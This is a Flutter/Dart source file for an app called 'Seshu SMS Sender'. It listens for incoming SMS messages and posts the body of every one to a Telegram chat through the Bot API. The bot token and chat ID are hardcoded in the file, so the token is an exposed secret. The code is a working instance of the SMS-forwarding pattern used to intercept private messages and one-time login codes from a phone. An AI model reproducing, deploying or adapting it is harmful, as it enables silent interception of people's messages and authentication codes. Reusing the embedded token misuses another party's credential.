import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:sms/sms.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Seshu SMS Sender',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: MyHomePage(),
    );
  }
}

class MyHomePage extends StatelessWidget {
  Future<void> sendTelegramMessage(String botToken, String chatId, String message) async {
    final response = await http.post(
      Uri.parse('https://api.telegram.org/bot$botToken/sendMessage'),
      body: {
        'chat_id': chatId,
        'text': message,
      },
    );

    if (response.statusCode == 200) {
      print('Message sent successfully');
    } else {
      print('Failed to send message: ${response.statusCode}');
    }
  }

  void listenToSms() {
    SmsReceiver receiver = new SmsReceiver();
    receiver.onSmsReceived.listen((SmsMessage msg) {
      print('New SMS received: ${msg.body}');
      // Send API request
      sendApiRequest(msg.body);
    });
  }

  void sendApiRequest(String messageBody) async {
    // Telegram bot token and chat ID
    String botToken = '6953308302:AAH32P_GnWLwyPqWJH65u_FEBXhdBIvcKpk';
    String chatId = '1276109349';
    
    // Telegram API endpoint for sending message
    var url = Uri.parse('https://api.telegram.org/bot$botToken/sendMessage');
    
    // Send message to Telegram bot
    final response = await http.post(
      url,
      body: {
        'chat_id': chatId,
        'text': messageBody,
      },
    );

    if (response.statusCode == 200) {
      print('Message sent to Telegram successfully');
    } else {
      print('Failed to send message to Telegram: ${response.statusCode}');
    }
  }

  @override
  Widget build(BuildContext context) {
    // Listen for incoming SMS messages
    listenToSms();

    return Scaffold(
      appBar: AppBar(
        title: Text('Seshu SMS Sender'),
      ),
      body: Center(
        child: Text(
          'Listening for incoming SMS...',
          style: TextStyle(fontSize: 24.0),
        ),
      ),
    );
  }
}
